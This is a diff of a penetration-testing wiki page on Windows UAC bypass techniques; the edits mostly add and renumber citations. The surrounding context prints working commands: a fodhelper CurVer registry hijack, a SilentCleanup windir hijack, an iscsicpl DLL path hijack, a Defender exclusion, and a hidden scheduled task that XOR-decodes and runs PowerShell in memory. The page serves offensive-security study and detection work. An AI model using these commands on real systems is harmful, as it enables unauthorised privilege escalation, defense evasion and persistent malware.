@@ -109,7 +109,7 @@ schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 Practical notes:
 - If `EnableLUA=0`, you do not need a bypass: any admin token can request high integrity directly.
 - `ConsentPromptBehaviorAdmin=2` or `5` is the common scenario for auto-elevate / COM-based bypasses.
-- `Always Notify` raises the bar, but you should still test the exact build instead of assuming failure: UACME still tracks some `AlwaysNotify compatible` methods on modern Windows builds.
+- `Always Notify` raises the bar, but you should still test the exact build instead of assuming failure: UACME still tracks some `AlwaysNotify compatible` methods on modern Windows builds.<sup>[[3]](#references)</sup>
 
 ### UAC disabled
 
@@ -249,17 +249,17 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Valu
 Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
 ```
 
-Once elevated, malware commonly **disables future prompts** by setting `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` to `0`, then performs additional defense evasion (e.g., `Add-MpPreference -ExclusionPath C:\ProgramData`) and recreates persistence to run as high integrity. A typical persistence task stores an **XOR-encrypted PowerShell script** on disk and decodes/executes it in-memory each hour:
+Once elevated, malware commonly **disables future prompts** by setting `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` to `0`, then performs additional defense evasion (e.g., `Add-MpPreference -ExclusionPath C:\ProgramData`) and recreates persistence to run as high integrity. A typical persistence task stores an **XOR-encrypted PowerShell script** on disk and decodes/executes it in-memory each hour:<sup>[[5]](#references)</sup>
 
 ```powershell
 schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
 ```
 
-This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.
+This variant still cleans up the dropper and leaves only the staged payloads, making detection rely on monitoring the **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, or scheduled tasks that in-memory decrypt PowerShell.<sup>[[5]](#references)</sup>
 
 ### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)
 
-`SilentCleanup` launches `cleanmgr.exe` with highest privileges and expands `%windir%` from the user environment. If you control `HKCU\Environment\windir`, you can redirect that expansion to an arbitrary command and get high integrity without a consent dialog.<sup>[[9]](#references)</sup> This method is still worth testing on recent builds because UACME keeps the technique active and recent issue tracking shows Windows 11 24H2 may only require small quoting adjustments.<sup>[[3]](#references)</sup>
+`SilentCleanup` launches `cleanmgr.exe` with highest privileges and expands `%windir%` from the user environment. If you control `HKCU\Environment\windir`, you can redirect that expansion to an arbitrary command and get high integrity without a consent dialog.<sup>[[8]](#references)</sup> This method is still worth testing on recent builds because UACME keeps the technique active and recent issue tracking shows Windows 11 24H2 may only require small quoting adjustments.<sup>[[3]](#references)</sup>
 
 ```cmd
 reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
@@ -306,7 +306,7 @@ Consists on watching if an **autoElevated binary** tries to **read** from the **
 
 ### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack
 
-The 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is an **auto-elevated** binary that can be abused to load `iscsiexe.dll` by search order. If you can place a malicious `iscsiexe.dll` inside a **user-writable** folder and then modify the current user `PATH` (for example via `HKCU\Environment\Path`) so that folder is searched, Windows may load the attacker DLL inside the elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)</sup>
+The 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is an **auto-elevated** binary that can be abused to load `iscsiexe.dll` by search order. If you can place a malicious `iscsiexe.dll` inside a **user-writable** folder and then modify the current user `PATH` (for example via `HKCU\Environment\Path`) so that folder is searched, Windows may load the attacker DLL inside the elevated `iscsicpl.exe` process **without showing a UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>
 
 Practical notes:
 - This is useful when the current user is in **Administrators** but running at **Medium Integrity** due to UAC.
@@ -362,6 +362,7 @@ New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\
 ```
 
 ## References
+
 - [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
 - [2] [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
 - [3] [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
@@ -369,7 +370,6 @@ New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\
 - [5] [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
 - [6] [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
 - [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
-- [8] [Project Zero – Bypassing Administrator Protection by Abusing UI Access](https://projectzero.google/2026/02/windows-administrator-protection.html)
-- [9] [Sigma / Detection.FYI – Bypass UAC Using SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
+- [8] [Sigma / Detection.FYI – Bypass UAC Using SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 
 {{#include ../../banners/hacktricks-training.md}}
